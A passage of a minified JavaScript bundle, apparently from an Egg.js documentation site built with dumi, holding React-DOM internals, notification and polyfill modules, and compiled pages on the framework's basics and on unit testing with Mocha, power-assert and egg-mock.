Error(o(90));Ae(a),Oe(a,r)}}}break;case"textarea":De(e,n);break;case"select":t=n.value,null!=t&&qe(e,!!n.multiple,t,!1)}},_=Oc,q=function(e,t,n,a,r){var l=Yi;Yi|=4;try{return ol(98,e.bind(null,t,n,a,r))}finally{Yi=l,Yi===Hi&&sl()}},M=function(){(Yi&(1|Wi|Vi))===Hi&&(Nc(),$c())},F=function(e,t){var n=Yi;Yi|=2;try{return e(t)}finally{Yi=n,Yi===Hi&&sl()}};var Ss={Events:[Hn,Bn,Wn,A,j,Jn,function(e){dt(e,Kn)},P,R,on,ht,$c,{current:!1}]};(function(e){var t=e.findFiberByHostInstance;es(r({},e,{overrideHookState:null,overrideProps:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:ee.ReactCurrentDispatcher,findHostInstanceByFiber:function(e){return e=st(e),null===e?null:e.stateNode},findFiberByHostInstance:function(e){return t?t(e):null},findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null}))})({findFiberByHostInstance:zn,bundleType:0,version:"16.14.0",rendererPackageName:"react-dom"}),t.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Ss,t.createPortal=js,t.findDOMNode=function(e){if(null==e)return null;if(1===e.nodeType)return e;var t=e._reactInternalFiber;if(void 0===t){if("function"===typeof e.render)throw Error(o(188));throw Error(o(268,Object.keys(e)))}return e=st(t),e=null===e?null:e.stateNode,e},t.flushSync=function(e,t){if((Yi&(Wi|Vi))!==Hi)throw Error(o(187));var n=Yi;Yi|=1;try{return ol(99,e.bind(null,t))}finally{Yi=n,sl()}},t.hydrate=function(e,t,n){if(!ys(t))throw Error(o(200));return ws(null,e,t,!0,n)},t.render=function(e,t,n){if(!ys(t))throw Error(o(200));return ws(null,e,t,!1,n)},t.unmountComponentAtNode=function(e){if(!ys(e))throw Error(o(40));return!!e._reactRootContainer&&(Ic((function(){ws(null,null,e,!1,(function(){e._reactRootContainer=null,e[Un]=null}))})),!0)},t.unstable_batchedUpdates=Oc,t.unstable_createPortal=function(e,t){return js(e,t,2<arguments.length&&void 0!==arguments[2]?arguments[2]:null)},t.unstable_renderSubtreeIntoContainer=function(e,t,n,a){if(!ys(n))throw Error(o(200));if(null==e||void 0===e._reactInternalFiber)throw Error(o(38));return ws(e,t,n,!1,a)},t.version="16.14.0"},mTot:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/structure"},"Structure")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/objects"},"Framework Built-in Objects")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/env"},"Runtime Environment")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/config"},"Configuration")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/middleware"},"Middleware")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/router"},"Router")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/controller"},"Controller")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/service"},"Service")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/plugin"},"Plugin")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/schedule"},"Scheduled Tasks")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/extend"},"Extend EGG")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"./basics/app-start"},"Application Startup Configuration")))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(o,{demos:n})}},ma9u:function(e,t,n){var a=n("Bscc"),r=n("NXx9"),l=n("tbdv"),o=n("a7jj"),i=function(){this.object=null,this.symbol=null,this.primitives=null,this.objectsByIndex=l(null)};i.prototype.get=function(e,t){return this[e]||(this[e]=t())},i.prototype.next=function(e,t,n){var l=n?this.objectsByIndex[e]||(this.objectsByIndex[e]=new r):this.primitives||(this.primitives=new a),o=l.get(t);return o||l.set(t,o=new i),o};var c=new i;e.exports=function(){var e,t,n=c,a=arguments.length;for(e=0;e<a;e++)o(t=arguments[e])&&(n=n.next(e,t,!0));if(this===Object&&n===c)throw TypeError("Composite keys must contain a non-primitive component");for(e=0;e<a;e++)o(t=arguments[e])||(n=n.next(e,t,!1));return n}},meFy:function(e,t,n){"use strict";Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var a=i(n("FU0I")),r=l(n("D7X3"));function l(e){return e&&e.__esModule?e:{default:e}}function o(e){if("function"!==typeof WeakMap)return null;var t=new WeakMap,n=new WeakMap;return(o=function(e){return e?n:t})(e)}function i(e,t){if(!t&&e&&e.__esModule)return e;if(null===e||"object"!==c(e)&&"function"!==typeof e)return{default:e};var n=o(t);if(n&&n.has(e))return n.get(e);var a={},r=Object.defineProperty&&Object.getOwnPropertyDescriptor;for(var l in e)if("default"!==l&&Object.prototype.hasOwnProperty.call(e,l)){var i=r?Object.getOwnPropertyDescriptor(e,l):null;i&&(i.get||i.set)?Object.defineProperty(a,l,i):a[l]=e[l]}return a["default"]=e,n&&n.set(e,a),a}function c(e){return c="function"==typeof Symbol&&"symbol"==typeof Symbol.iterator?function(e){return typeof e}:function(e){return e&&"function"==typeof Symbol&&e.constructor===Symbol&&e!==Symbol.prototype?"symbol":typeof e},c(e)}function s(e,t){var n="undefined"!==typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(!n){if(Array.isArray(e)||(n=m(e))||t&&e&&"number"===typeof e.length){n&&(e=n);var a=0,r=function(){};return{s:r,n:function(){return a>=e.length?{done:!0}:{done:!1,value:e[a++]}},e:function(e){throw e},f:r}}throw new TypeError("Invalid attempt to iterate non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}var l,o=!0,i=!1;return{s:function(){n=n.call(e)},n:function(){var e=n.next();return o=e.done,e},e:function(e){i=!0,l=e},f:function(){try{o||null==n["return"]||n["return"]()}finally{if(i)throw l}}}}function u(e,t){return g(e)||h(e,t)||m(e,t)||d()}function d(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function m(e,t){if(e){if("string"===typeof e)return p(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?p(e,t):void 0}}function p(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function h(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}function g(e){if(Array.isArray(e))return e}function f(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function E(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?f(Object(n),!0).forEach((function(t){b(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):f(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function b(e,t,n){return t=v(t),t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function v(e){var t=y(e,"string");return"symbol"===c(t)?t:String(t)}function y(e,t){if("object"!==c(e)||null===e)return e;var n=e[Symbol.toPrimitive];if(void 0!==n){var a=n.call(e,t||"default");if("object"!==c(a))return a;throw new TypeError("@@toPrimitive must return a primitive value.")}return("string"===t?String:Number)(e)}var k=function(e,t){var n=function(){for(var e,n=arguments.length,a=new Array(n),r=0;r<n;r++)a[r]=arguments[r];var l=a[1].replace(/([^^])\/$/,"$1");return E(E({},(null===(e=a[0].find((function(e){var t=e.path;return t===l})))||void 0===e?void 0:e.meta)||{}),{},{__pathname:t})},r=(0,a.useState)(n(e,t)),l=u(r,2),o=l[0],i=l[1];return(0,a.useLayoutEffect)((function(){i(n(e,t))}),[t]),o},w=function(e,t){var n=function(){for(var t,n=arguments.length,a=new Array(n),r=0;r<n;r++)a[r]=arguments[r];return(null===(t=a[0].find((function(e){return new RegExp("/".concat(e.name,"(/|$)")).test(a[1])})))||void 0===t?void 0:t.name)||e[0].name},r=(0,a.useState)(n(e,t)),l=u(r,2),o=l[0],i=l[1];return(0,a.useLayoutEffect)((function(){i(n(e,t))}),[t]),o},x=function(e,t,n){var r=function(){for(var e,t=arguments.length,n=new Array(t),a=0;a<t;a++)n[a]=arguments[a];for(var r=n[0].navs[n[1]]||[],l="*",o=r.length-1;o>=0;o-=1){var i=r[o],c=[i].concat(i.children).filter(Boolean),s=c.find((function(e){return e.path&&new RegExp("^".concat(e.path.replace(/\.html$/,""),"(/|.|$)")).test(n[2])}));if(s){l=s.path;break}}return(null===(e=n[0].menus[n[1]])||void 0===e?void 0:e[l])||[]},l=(0,a.useState)(r(e,t,n)),o=u(l,2),i=o[0],c=o[1];return(0,a.useLayoutEffect)((function(){c(r(e,t,n))}),[e.navs,e.menus,t,n]),i},j=function(e,t,n){var r=function(){for(var t=arguments.length,a=new Array(t),r=0;r<t;r++)a[r]=arguments[r];return a[0]===a[1][0].name?a[2].path:"".concat(n.path,"/").concat(e).replace(/\/\//,"/")},l=(0,a.useState)(r(e,t,n)),o=u(l,2),i=o[0],c=o[1];return(0,a.useLayoutEffect)((function(){c(r(e,t,n))}),[e]),i},S=function e(t){var n,a,r=s(t);try{for(r.s();!(a=r.n()).done;){var l=a.value;if(l.__dumiRoot){n=l.routes;break}if(l.routes&&(n=e(l.routes)))break}}catch(o){r.e(o)}finally{r.f()}return n},C=function(e){var t=e.location,n=e.route,l=e.children,o=e.config,i=e.apis,c=e.demos,s=t.pathname.replace(n.path.replace(/^\/$/,"//"),""),u=S(e.routes)||[],d=k(u,t.pathname),m=w(o.locales,s),p=x(o,m,t.pathname),h=j(m,o.locales,n);return a["default"].createElement(r["default"].Provider,{value:{config:o,meta:d.__pathname===t.pathname?d:{},locale:m,nav:o.navs[m]||[],menu:p,base:h,routes:u,apis:i,demos:c}},l)},A=C;t["default"]=A},mqtR:function(e,t,n){"use strict";var a=n("0mt+"),r=n("9Rcy"),l=n("XejE"),o=n("m/os"),i=n("XaNN"),c=n("u3TI");r&&a({target:"Object",proto:!0,forced:l},{__defineGetter__:function(e,t){c.f(o(this),e,{get:i(t),enumerable:!0,configurable:!0})}})},n0SI:function(e,t,n){"use strict";var a,r=n("EJBU"),l=n("2EJr"),o=n("3Qq0"),i=n("E3E7"),c=n("+g4N"),s=n("zraO"),u=n("+ujd"),d=n("FU0I"),m=n("ojUw"),p=n("DytP"),h=n("nzxN"),g=n("kqhb"),f=Object(o["a"])({},g),E=f.version,b=f.render,v=f.unmountComponentAtNode;try{var y=Number((E||"").split(".")[0]);y>=18&&(a=f.createRoot)}catch(H){}function k(e){var t=f.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED;t&&"object"===Object(h["a"])(t)&&(t.usingClientEntryPoint=e)}var w="__rc_react_root__";function x(e,t){k(!0);var n=t[w]||a(t);k(!1),n.render(e),t[w]=n}function j(e,t){b(e,t)}function S(e,t){a?x(e,t):j(e,t)}function C(e){return A.apply(this,arguments)}function A(){return A=Object(p["a"])(Object(m["a"])().mark((function e(t){return Object(m["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:return e.abrupt("return",Promise.resolve().then((function(){var e;null===(e=t[w])||void 0===e||e.unmount(),delete t[w]})));case 1:case"end":return e.stop()}}),e)}))),A.apply(this,arguments)}function L(e){v(e)}function T(e){return N.apply(this,arguments)}function N(){return N=Object(p["a"])(Object(m["a"])().mark((function e(t){return Object(m["a"])().wrap((function(e){while(1)switch(e.prev=e.next){case 0:if(void 0===a){e.next=2;break}return e.abrupt("return",C(t));case 2:L(t);case 3:case"end":return e.stop()}}),e)}))),N.apply(this,arguments)}var O=n("VGn1"),I=n.n(O),P=n("64/3"),R=n("ylap"),_=n("bymz"),q=["getContainer"],M=0,F=Date.now();function D(){var e=M;return M+=1,"rcNotification_".concat(F,"_").concat(e)}var U=function(e){Object(s["a"])(n,e);var t=Object(u["a"])(n);function n(){var e;Object(i["a"])(this,n);for(var a=arguments.length,r=new Array(a),l=0;l<a;l++)r[l]=arguments[l];return e=t.call.apply(t,[this].concat(r)),e.state={notices:[]},e.hookRefs=new Map,e.add=function(t,n){var a,r=null!==(a=t.key)&&void 0!==a?a:D(),l=Object(o["a"])(Object(o["a"])({},t),{},{key:r}),i=e.props.maxCount;e.setState((function(e){var t=e.notices,a=t.map((function(e){return e.notice.key})).indexOf(r),o=t.concat();return-1!==a?o.splice(a,1,{notice:l,holderCallback:n}):(i&&t.length>=i&&(l.key=o[0].notice.key,l.updateMark=D(),l.userPassKey=r,o.shift()),o.push({notice:l,holderCallback:n})),{notices:o}}))},e.remove=function(t){e.setState((function(e){var n=e.notices;return{notices:n.filter((function(e){var n=e.notice,a=n.key,r=n.userPassKey,l=null!==r&&void 0!==r?r:a;return l!==t}))}}))},e.noticePropsMap={},e}return Object(c["a"])(n,[{key:"getTransitionName",value:function(){var e=this.props,t=e.prefixCls,n=e.animation,a=this.props.transitionName;return!a&&n&&(a="".concat(t,"-").concat(n)),a}},{key:"render",value:function(){var e=this,t=this.state.notices,n=this.props,a=n.prefixCls,r=n.className,i=n.closeIcon,c=n.style,s=[];return t.forEach((function(n,r){var l=n.notice,c=n.holderCallback,u=r===t.length-1?l.updateMark:void 0,d=l.key,m=l.userPassKey,p=Object(o["a"])(Object(o["a"])(Object(o["a"])({prefixCls:a,closeIcon:i},l),l.props),{},{key:d,noticeKey:m||d,updateMark:u,onClose:function(t){var n;e.remove(t),null===(n=l.onClose)||void 0===n||n.call(l)},onClick:l.onClick,children:l.content});s.push(d),e.noticePropsMap[d]={props:p,holderCallback:c}})),d["createElement"]("div",{className:I()(a,r),style:c},d["createElement"](P["a"],{keys:s,motionName:this.getTransitionName(),onVisibleChanged:function(t,n){var a=n.key;t||delete e.noticePropsMap[a]}},(function(t){var n=t.key,r=t.className,i=t.style,c=t.visible,s=e.noticePropsMap[n],u=s.props,m=s.holderCallback;return m?d["createElement"]("div",{key:n,className:I()(r,"".concat(a,"-hook-holder")),style:Object(o["a"])({},i),ref:function(t){"undefined"!==typeof n&&(t?(e.hookRefs.set(n,t),m(t,u)):e.hookRefs["delete"](n))}}):d["createElement"](R["a"],Object(l["a"])({},u,{className:I()(r,null===u||void 0===u?void 0:u.className),style:Object(o["a"])(Object(o["a"])({},i),null===u||void 0===u?void 0:u.style),visible:c}))})))}}]),n}(d["Component"]);U.newInstance=void 0,U.defaultProps={prefixCls:"rc-notification",animation:"fade",style:{top:65,left:"50%"}},U.newInstance=function(e,t){var n=e||{},a=n.getContainer,o=Object(r["a"])(n,q),i=document.createElement("div");if(a){var c=a();c.appendChild(i)}else document.body.appendChild(i);var s=!1;function u(e){s||(s=!0,t({notice:function(t){e.add(t)},removeNotice:function(t){e.remove(t)},component:e,destroy:function(){T(i),i.parentNode&&i.parentNode.removeChild(i)},useNotification:function(){return Object(_["a"])(e)}}))}S(d["createElement"](U,Object(l["a"])({},o,{ref:u})),i)};var z=U;t["a"]=z},nBv4:function(e,t,n){"use strict";var a=n("AzF/"),r=n("oyD1"),l=n("Xdqv"),o=n("zKw/"),i="toString",c=RegExp.prototype,s=c[i],u=l((function(){return"/a/b"!=s.call({source:"a",flags:"b"})})),d=s.name!=i;(u||d)&&a(RegExp.prototype,i,(function(){var e=r(this),t=String(e.source),n=e.flags,a=String(void 0===n&&e instanceof RegExp&&!("flags"in c)?o.call(e):n);return"/"+t+"/"+a}),{unsafe:!0})},nLQS:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("h2",{id:"why-unit-testing"},r.a.createElement(l["AnchorLink"],{to:"#why-unit-testing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Why Unit Testing"),r.a.createElement("p",null,"Let us start with a few questions:"),r.a.createElement("ul",null,r.a.createElement("li",null,"How to measure the quality of code"),r.a.createElement("li",null,"How to ensure the quality of code"),r.a.createElement("li",null,"Are you free to refactor code"),r.a.createElement("li",null,"How to guarantee the correctness of refactored code"),r.a.createElement("li",null,"Have you confidence to release your untested code")),r.a.createElement("p",null,"If you are not sure, you probably need unit testing."),r.a.createElement("p",null,"Actually, it brings us tremendous benefits:"),r.a.createElement("ul",null,r.a.createElement("li",null,"guarantee the quality of maintaining code"),r.a.createElement("li",null,"guarantee the correctness of reconstruction"),r.a.createElement("li",null,"enhance confidence"),r.a.createElement("li",null,"automation")),r.a.createElement("p",null,"It's more important to use unit tests in a web application during the fast iteration, because each testing case can contribute to the increasing stability of the application. The result of various inputs in each test is definite, so it's obvious to detect whether the changed code has an impact on correctness or not."),r.a.createElement("p",null,"Therefore, code, such as in Controller, Service, Helper, Extend and so on, require corresponding unit testing for quality assurances, especially modification of the framework or plugins, of which test coverage is strongly recommended to be 100%."),r.a.createElement("h2",{id:"test-framework"},r.a.createElement(l["AnchorLink"],{to:"#test-framework","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Test Framework"),r.a.createElement("p",null,"When ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/search?q=test%20framework&page=1&ranking=popularity"},"searching 'test framework' in npm"),", there are a mass of test frameworks owning their own unique characteristics."),r.a.createElement("h3",{id:"mocha"},r.a.createElement(l["AnchorLink"],{to:"#mocha","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Mocha"),r.a.createElement("p",null,"We choose and recommend you to use ",r.a.createElement(l["Link"],{to:"http://mochajs.org/"},"Mocha"),", which is very rich in functionality and supports running in Node.js and Browser, what's more, it's very friendly to asynchronous test support."),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Mocha is a feature-rich JavaScript test framework running on Node.js and in the browser, making asynchronous testing simple and fun. Mocha tests run serially, allowing for flexible and accurate reporting, while mapping uncaught exceptions to the correct test cases.")),r.a.createElement("h3",{id:"ava"},r.a.createElement(l["AnchorLink"],{to:"#ava","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"AVA"),r.a.createElement("p",null,"Why not another recently popular framework ",r.a.createElement(l["Link"],{to:"https://github.com/avajs/ava"},"AVA")," which looks like faster? AVA is great, but practice of several projects tells us the truth that code is harder to write."),r.a.createElement("p",null,"Comments from ",r.a.createElement(l["Link"],{to:"https://github.com/dead-horse"},"@dead-horse"),":"),r.a.createElement("blockquote",null,r.a.createElement("ul",null,r.a.createElement("li",null,"AVA is not stable enough, for example, CPU capacity is going to be overloaded when plenty of files are running concurrently. The solution of setting parameter to control concurrent could work, but 'only mode' would be not functioning any more."),r.a.createElement("li",null,"Running cases concurrently makes great demands on implementation, because each test has to be independent, especially containing mock."),r.a.createElement("li",null,"Considering the expensive initialization of app, it's irrational of AVA to execute each file in an independent process initializing their own app while serial framework does only one time."))),r.a.createElement("p",null,"Comments from ",r.a.createElement(l["Link"],{to:"https://github.com/fool2fish"},"@fool2fish"),"\uff1a"),r.a.createElement("blockquote",null,r.a.createElement("ul",null,r.a.createElement("li",null,"It's faster to use AVA in simple application(maybe too simple to judge). But it's not recommended to use in complicate one because of its considerable flaws, such as incapability of offering accurate error stacks; meanwhile, concurrency may cause service relying on other test settings to hang up which reduces the success rate of the test. Therefore, process testing, for example, CRUD operations of database, should not use AVA."))),r.a.createElement("h2",{id:"assertion-library"},r.a.createElement(l["AnchorLink"],{to:"#assertion-library","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Assertion Library"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.npmjs.com/search?q=assert&page=1&ranking=popularity"},"Assertion libraries"),", as flourishing as test frameworks, are emerged continuously. The one we used has changed from ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/assert.html"},"assert")," to ",r.a.createElement(l["Link"],{to:"https://github.com/shouldjs/should.js"},"should"),", and then to ",r.a.createElement(l["Link"],{to:"https://github.com/Automattic/expect.js"},"expect"),", but we are still trying to find better one."),r.a.createElement("p",null,"In the end, we go back to the original assertion library because of the appearance of ",r.a.createElement(l["Link"],{to:"https://github.com/power-assert-js/power-assert"},"power-assert"),", which best expresses ",r.a.createElement(l["Link"],{to:"https://github.com/atian25/blog/issues/16"},"\u300eNo API is the best API\u300f"),"."),r.a.createElement("p",null,"To be Short, Here are it's advantages:"),r.a.createElement("ul",null,r.a.createElement("li",null,"No API is the best API. Assert is all."),r.a.createElement("li",null,"** powerful failure message **"),r.a.createElement("li",null,"** powerful failure message **"),r.a.createElement("li",null,"** powerful failure message **")),r.a.createElement("p",null,"You may intentionally make mistakes in order to see these failure messages.",r.a.createElement("img",{src:"https://cloud.githubusercontent.com/assets/227713/20919940/19e83de8-bbd9-11e6-8951-bf4a332f9b5a.png",alt:""})),r.a.createElement("h2",{id:"test-rule"},r.a.createElement(l["AnchorLink"],{to:"#test-rule","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Test Rule"),r.a.createElement("p",null,"Framework defines some fundamental rules on unit testing to keep us focus on coding rather than assistant work, such as how to execute test cases. Egg does some basic conventions for unit testing."),r.a.createElement("h3",{id:"directory-structure"},r.a.createElement(l["AnchorLink"],{to:"#directory-structure","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Directory Structure"),r.a.createElement("p",null,"Test code is demand to be put in ",r.a.createElement("code",null,"test")," directory, include ",r.a.createElement("code",null,"fixtures")," and assistant scripts."),r.a.createElement("p",null,"Each Test file has to be named by the pattern of ",r.a.createElement("code",null,"$","{","filename","}",".test.js"),", ending with ",r.a.createElement("code",null,".test.js"),"."),r.a.createElement("p",null,"For example:"),r.a.createElement(o["a"],{code:"test\n\u251c\u2500\u2500 controller\n\u2502\xa0\xa0 \u2514\u2500\u2500 home.test.js\n\u251c\u2500\u2500 hello.test.js\n\u2514\u2500\u2500 service\n    \u2514\u2500\u2500 user.test.js",lang:"bash"}),r.a.createElement("h3",{id:"test-tool"},r.a.createElement(l["AnchorLink"],{to:"#test-tool","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Test Tool"),r.a.createElement("p",null,"Consistently using ",r.a.createElement(l["AnchorLink"],{to:"./development#unit_testing"},"egg-bin to launch tests")," , which automatically loads modules like ",r.a.createElement(l["Link"],{to:"https://mochajs.org/"},"Mocha"),", ",r.a.createElement(l["Link"],{to:"https://github.com/blakeembrey/co-mocha"},"co-mocha"),", ",r.a.createElement(l["Link"],{to:"https://github.com/power-assert-js/power-assert"},"power-assert"),", ",r.a.createElement(l["Link"],{to:"https://github.com/istanbuljs/nyc"},"nyc")," into test scripts, so that we can ",r.a.createElement("strong",null,"concentrate on writing tests")," without wasting time on the choice of various test tools or modules."),r.a.createElement("p",null,"The only thing you need to do is setting ",r.a.createElement("code",null,"scripts.test")," in ",r.a.createElement("code",null,"package.json"),"."),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "test": "egg-bin test"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"Then tests would be launched by executing ",r.a.createElement("code",null,"npm test")," command."),r.a.createElement(o["a"],{code:"npm test\n\n> unittest-example@ test /Users/mk2/git/github.com/eggjs/examples/unittest\n> egg-bin test\n\n  test/hello.test.js\n    \u2713 should work\n\n  1 passing (10ms)",lang:"bas"}),r.a.createElement("h2",{id:"test-preparation"},r.a.createElement(l["AnchorLink"],{to:"#test-preparation","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Test Preparation"),r.a.createElement("p",null,"This chapter introduces you how to write test, and introduction of tests for the framework and plugins are located in ",r.a.createElement(l["Link"],{to:"../advanced/framework"},"framework")," and ",r.a.createElement(l["Link"],{to:"../advanced/plugin"},"plugin"),"."),r.a.createElement("h3",{id:"mock"},r.a.createElement(l["AnchorLink"],{to:"#mock","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"mock"),r.a.createElement("p",null,"Generally, a complete application test requires initialization and cleanup, such as deleting temporary files or destroy application. Also, we have to deal with exceptional situations like network problem and exception visit of server."),r.a.createElement("p",null,"We extracted an ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock"},"egg-mock"),"module for mock, help for quick implementation of application unit tests, supporting fast creation of ctx to test."),r.a.createElement("h3",{id:"app"},r.a.createElement(l["AnchorLink"],{to:"#app","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"app"),r.a.createElement("p",null,"Before launching, we have to create an instance of App to test code of application-level like Controller, Middleware or Service."),r.a.createElement("p",null,"We can easily create an app instance with Mocha's ",r.a.createElement("code",null,"before")," hook through egg-mock."),r.a.createElement(o["a"],{code:"// test/controller/home.test.js\nconst assert = require('assert');\nconst mock = require('egg-mock');\n\ndescribe('test/controller/home.test.js', () => {\n  let app;\n  before(() => {\n    // create a current app instance\n    app = mock.app();\n    // execute tests after app is ready\n    return app.ready();\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Now, we have an app instance, and it's the base of all the following tests. See more about app at ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock#options"},r.a.createElement("code",null,"mock.app(options)")),"."),r.a.createElement("p",null,"It's redundancy to create an instance in each test file, so we offered an bootstrap file in egg-mock to create it conveniently."),r.a.createElement(o["a"],{code:"// test/controller/home.test.js\nconst { app, mock, assert } = require('egg-mock/bootstrap');\n\ndescribe('test/controller/home.test.js', () => {\n  // test cases\n});",lang:"js"}),r.a.createElement("h3",{id:"ctx"},r.a.createElement(l["AnchorLink"],{to:"#ctx","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"ctx"),r.a.createElement("p",null,"Except app, tests for Extend, Service and Helper are also taken into consideration. Let's create a context through ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mock#appmockcontextoptions"},r.a.createElement("code",null,"app.mockContext(options)"))," offered by egg-mock."),r.a.createElement(o["a"],{code:"it('should get a ctx', () => {\n  const ctx = app.mockContext();\n  assert(ctx.method === 'GET');\n  assert(ctx.url === '/');\n});",lang:"js"}),r.a.createElement("p",null,"If we want to mock the data for ",r.a.createElement("code",null,"ctx.user"),", we can do that by passing the data parameter to mockContext:"),r.a.createElement(o["a"],{code:"it('should mock ctx.user', () => {\n  const ctx = app.mockContext({\n    user: {\n      name: 'fengmk2',\n    },\n  });\n  assert(ctx.user);\n  assert(ctx.user.name === 'fengmk2');\n});",lang:"js"}),r.a.createElement("p",null,"Since we have got the app and the context, you are free to do a lot of tests."),r.a.createElement("h2",{id:"testing-order"},r.a.createElement(l["AnchorLink"],{to:"#testing-order","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Testing Order"),r.a.createElement("p",null,"Pay close attention to testing order, and make sure any chunk of code is executed as you expected."),r.a.createElement("p",null,"Common Error:"),r.a.createElement(o["a"],{code:"// Bad\nconst { app } = require('egg-mock/bootstrap');\n\ndescribe('bad test', () => {\n  doSomethingBefore();\n\n  it('should redirect', () => {\n    return app.httpRequest().get('/').expect(302);\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Mocha is going to load all the code in the beginning, which means ",r.a.createElement("code",null,"doSomethingBefore")," would be invoked before execution. It's not expected when especially using 'only' to specify the test."),r.a.createElement("p",null,"It's supposed to locate in a ",r.a.createElement("code",null,"before")," hook in the suite of a particular test case."),r.a.createElement(o["a"],{code:"// Good\nconst { app } = require('egg-mock/bootstrap');\n\ndescribe('good test', () => {\n  before(() => doSomethingBefore());\n\n  it('should redirect', () => {\n    return app.httpRequest().get('/').expect(302);\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Mocha have keywords - before, after, beforeEach and afterEach - to set up preconditions and clean-up after your tests. These keywords could be multiple and execute in strict order."),r.a.createElement(o["a"],{code:"describe('egg test', () => {\n  before(() => console.log('order 1'));\n  before(() => console.log('order 2'));\n  after(() => console.log('order 6'));\n  beforeEach(() => console.log('order 3'));\n  afterEach(() => console.log('order 5'));\n  it('should worker', () => console.log('order 4'));\n});",lang:"js"}),r.a.createElement("h2",{id:"asynchronous-test"},r.a.createElement(l["AnchorLink"],{to:"#asynchronous-test","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Asynchronous Test"),r.a.createElement("p",null,"egg-bin supports asynchronous 